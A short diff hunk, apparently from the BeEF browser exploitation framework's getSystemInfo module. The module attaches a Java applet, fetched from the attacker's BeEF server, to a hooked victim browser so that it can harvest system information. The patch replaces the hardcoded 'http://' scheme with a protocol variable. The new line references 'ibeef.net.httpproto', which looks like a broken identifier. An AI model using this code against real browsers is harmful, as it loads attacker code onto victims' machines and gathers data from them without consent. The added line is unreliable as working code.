@@ -10,7 +10,7 @@ beef.execute(function() {
 	var timeout = 30;
 	var output;
 
-	beef.dom.attachApplet('getSystemInfo', 'getSystemInfo', 'getSystemInfo', "http://"+beef.net.host+":"+beef.net.port+"/", null, null);
+	beef.dom.attachApplet('getSystemInfo', 'getSystemInfo', 'getSystemInfo', ibeef.net.httpproto+"://"+beef.net.host+":"+beef.net.port+"/", null, null);
 
 	if (beef.browser.isFF()) {
 
